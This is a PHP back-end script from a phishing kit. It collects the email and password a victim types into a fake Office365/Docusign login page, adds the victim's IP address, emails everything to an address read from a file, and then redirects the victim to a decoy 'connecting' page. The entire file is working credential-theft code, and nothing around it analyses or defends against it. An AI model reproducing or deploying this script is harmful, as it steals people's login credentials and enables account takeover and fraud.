<?php
$filename="email.txt";
$handle=fopen($filename,"r");
$contents=fread
($handle,filesize($filename));
$emailss=($contents);


if(trim($_POST['email']) == "" && trim($_POST['password']) ==""){
 
   header('Location: index.html');
   exit(); 
}

    $pfw_ip= $_SERVER['REMOTE_ADDR'];
	$emailto = $emailss;
	$email_from = "Elamir@worldb.com";
    $email_subject = "$pfw_ip Office365 info.";
    
	$email = $_POST['email'];
	$password = $_POST['password'];
	

    $email_message = "Received details below for Docusign\n\n";
    function clean_string($string) {
 
      $bad = array("content-type","bcc:","to:","cc:","href");
 
      return str_replace($bad,"",$string);
 
    }  
	

    $email_message .= "<==============>Office365 login Details <==============>\n";  
    $email_message .= "Email: ==========>  ".clean_string($email)."\n";  
    $email_message .= "Password: ============>  ".clean_string($password)."\n";
    $email_message .= "\n";
	
	
	
// create email headers
 
$headers = 'From: '.$email_from."\r\n".
 
'Reply-To: '.$emailto."\r\n" .
 
'X-Mailer: PHP/' . phpversion();
 
@mail($emailto, $email_subject, $email_message, $headers); 
 
header("location: connecting.html?sitedomain=docusign.net.webmail&lang=en&seamless=novl&offerId=newmail-en-us-v2&authLev=0&siteState");
?>
 
<!-- include your own success html here -->
 

 
 
<?php
 

 
?>